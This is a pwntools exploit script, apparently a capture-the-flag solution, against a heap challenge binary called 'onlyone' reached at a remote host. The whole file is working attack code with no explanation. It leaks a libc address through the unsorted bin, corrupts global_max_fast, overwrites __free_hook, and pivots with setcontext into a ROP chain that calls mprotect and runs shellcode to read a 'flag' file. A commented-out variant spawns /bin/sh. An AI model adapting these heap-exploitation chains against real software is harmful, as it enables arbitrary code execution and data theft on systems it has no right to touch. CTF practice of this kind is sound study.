#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./onlyone')
    elf = ELF('./onlyone')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31013)
    elf = ELF('./onlyone')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def choice(c):
    p.sendlineafter('(your choice) >> ', str(c))

def add(data):
    choice(1)
    p.sendafter('(pls input your message) >> ', data)

def edit(idx, data):
    choice(2)
    p.sendlineafter('(pls input the index of message) >> ', str(idx))
    p.sendafter('(pls input your message) >> ', data)

def show(idx):
    choice(3)
    p.sendlineafter('(pls input the index of message) >> ', str(idx))

def delete(idx):
    choice(4)
    p.sendlineafter('(pls input the index of message) >> ', str(idx))

# leak libc
add('0')
add('1')
delete(0)
show(0)
p.recvuntil('(here is your message) >> ')
unsorted_bin = u64(p.recv(6).ljust(8, '\x00'))
info('unsorted_bin = ' + hex(unsorted_bin))
libc_base = unsorted_bin - 0x3c4b78
info('libc_base = ' + hex(libc_base))

# unsorted bin attack
global_max_fast = libc_base + 0x3c67f8
info('global_max_fast = ' + hex(global_max_fast))
edit(0, p64(unsorted_bin) + p64(global_max_fast - 0x10))
add('2')
delete(1)

# overwrite __free_hook
free_hook = libc_base + libc.sym['__free_hook']
setcontext = libc_base + libc.sym['setcontext']
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
target = free_hook - 0x59
edit(1, p64(target))
edit(0, 0x18 * '\x00' + p64(233)) # bypass magic
add('0')
## system("/bin/sh\x00")
## https://n0nop.com/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/#CISCN-2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Pwn-pwn4
'''
add(0x31 * '\x00' + p64(system))
edit(0, '/bin/sh\x00')
delete(0)
'''
## use setcontext to orw
## https://psyduck0409.github.io/2021/04/25/2021/setcontext%E5%AD%A6%E4%B9%A0/#oooorder
mprotect = libc_base + libc.sym['mprotect']
target_page = free_hook & 0xfffffffffffff000
pop_rdi_ret = libc_base + 0x0000000000021112
pop_rsi_ret = libc_base + 0x00000000000202f8
pop_rdx_ret = libc_base + 0x0000000000001b92
ret = libc_base + 0x0000000000000937
sh = shellcode = shellcraft.amd64.pushstr('flag').rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_open', "rsp", 0).rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_read', "rax", free_hook, 0x40).rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_write', 1, free_hook, 0x40).rstrip()
info(hex(len(asm(sh))))
sh_addr = free_hook + 0x67
rop = p64(pop_rdi_ret) + p64(target_page) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_ret) + p64(7) + p64(mprotect) + p64(sh_addr)
add((0x31 * '\x00' + p64(setcontext + 0x35) + rop).ljust(0xa0 - 0x18, '\x00') + p64(free_hook + 0x8) + p64(ret) + asm(sh))
delete(2)
#gdb.attach(p)

p.interactive()

